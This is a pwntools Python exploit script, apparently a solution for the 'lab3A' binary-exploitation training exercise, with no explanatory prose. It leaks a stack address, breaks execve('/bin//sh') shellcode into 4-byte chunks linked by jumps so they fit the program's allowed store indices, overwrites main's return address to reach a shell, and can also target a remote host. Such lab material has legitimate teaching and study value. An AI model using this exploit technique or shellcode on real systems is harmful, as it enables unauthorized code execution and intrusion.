#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab3A')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *store_number+144
b *main+553
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def read_data(idx):
    io.sendline(b"read")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"is ")
    stack = int(io.recv().split(b"\n")[0])
    info("stack leak: %#x", stack)
    return stack


def store_data(value, idx):
    io.sendline(b"store")
    io.sendlineafter(b":", str(value).encode())
    io.sendlineafter(b":", str(idx).encode())


def parse(shellcode):
    sc_len = len(shellcode)
    n = sc_len
    size_int = 4
    array = []

    for i in range(0, n, size_int):
        sc = shellcode[i:i+size_int]

        # if len(sc) != size_int:
        #     remainder = len(sc) % size_int
        #     sc += b"\x90" * (size_int - remainder)

        dword = int.from_bytes(sc, byteorder='little')
        array.append(dword)

    return array


def solve():

    stack = read_data(111)
    buf_addr = stack - 0x270 + 4
    main_ret = buf_addr + 0x1b4 - 4
    info("buf addr: %#x", buf_addr)
    info("main ret addr: %#x", main_ret)

    """
    # Shellcode disassembly: https://defuse.ca/online-x86-assembler.htm#disassembly
    
    Shellcode execve:
    0:  31 c0                   xor    eax,eax
    2:  50                      push   eax
    3:  68 2f 2f 73 68          push   0x68732f2f
    8:  68 2f 62 69 6e          push   0x6e69622f
    d:  89 e3                   mov    ebx,esp
    f:  89 c1                   mov    ecx,eax
    11: 89 c2                   mov    edx,eax
    13: b0 0b                   mov    al,0xb
    15: cd 80                   int    0x80 

    skip 4 bytes using jmp instr
    0: eb 04                    jmp 4
    """
    
    shellcode  = b"\x31\xc0\x90\x90"
    shellcode += b"\x90\x90\xeb\x04"
    shellcode += b"\x50\x90\x90\x90"
    shellcode += b"\x90\x90\xeb\x04"
    shellcode += b"\x68\x2f\x2f\x73"
    shellcode += b"\x68\x90\xeb\x04"
    shellcode += b"\x68\x2f\x62\x69"
    shellcode += b"\x6e\x90\xeb\x04"
    shellcode += b"\x89\xe3\x90\x90"
    shellcode += b"\x90\x90\xeb\x04"
    shellcode += b"\x89\xc1\x90\x90"
    shellcode += b"\x90\x90\xeb\x04"
    shellcode += b"\x89\xc2\x90\x90"
    shellcode += b"\x90\x90\xeb\x04"
    shellcode += b"\xb0\x0b\x90\x90"
    shellcode += b"\x90\x90\xeb\x04"
    shellcode += b"\xcd\x80\x90\x90"
    shellcode += b"\x90\x90\xeb\x04"

    shellcode = parse(shellcode)
    store_idx = []

    for i in range(30):
        if i % 3 != 0:
            store_idx.append(i)
    
    for j in range(len(shellcode)):
        store_data(shellcode[j], store_idx[j])

    store_data(buf_addr, 0x1b4 // 4)
    io.sendline(b"quit")
    io.clean()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

